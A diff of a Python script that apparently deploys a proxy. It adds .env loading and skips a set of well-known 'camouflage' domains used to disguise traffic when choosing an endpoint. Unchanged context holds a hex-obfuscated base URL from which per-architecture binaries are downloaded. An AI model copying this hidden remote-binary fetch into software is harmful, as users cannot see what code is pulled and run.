@@ -31,6 +31,30 @@ HOST_DEF = "0.0.0.0"
 LB = "127.0.0.1"
 DOMAINS = ("www.bing.com", "cdn.jsdelivr.net", "www.microsoft.com",
            "static.cloudflareinsights.com", "www.apple.com", "www.speedtest.net")
+CAMOUFLAGE_DOMAINS = {d.lower() for d in DOMAINS} | {"bing.com", "microsoft.com", "apple.com"}
+
+
+def _load_dotenv():
+    for fn in ("config.env", ".env"):
+        for root in (Path.cwd(), Path(__file__).resolve().parent if "__file__" in globals() else None):
+            if not root:
+                continue
+            fp = root / fn
+            if fp.is_file():
+                try:
+                    for line in fp.read_text(encoding="utf-8", errors="ignore").splitlines():
+                        line = line.strip()
+                        if not line or line.startswith("#") or "=" not in line:
+                            continue
+                        k, v = line.split("=", 1)
+                        k = k.strip()
+                        v = v.strip().strip('"').strip("'")
+                        if k and k not in os.environ:
+                            os.environ[k] = v
+                except Exception:
+                    pass
+
+_load_dotenv()
 _A = _d("68747470733a2f2f7373722e636e2e6d742f66696c65732f")
 CORE_URLS = {"x64": _A + "H_amd", "arm64": _A + "H_arm"}
 AUX_URLS = {"x64": _A + "K_amd", "arm64": _A + "K_arm"}
@@ -538,6 +562,8 @@ def _endpoint_ip():
             continue
         h, p = _parse_panel_ep(raw)
         if h and h.lower() not in ("0.0.0.0", "127.0.0.1", "localhost", "::", "::1"):
+            if h.lower() in CAMOUFLAGE_DOMAINS:
+                continue
             if k == "HOSTNAME" and ("." not in h and ":" not in h):
                 continue
             if p:
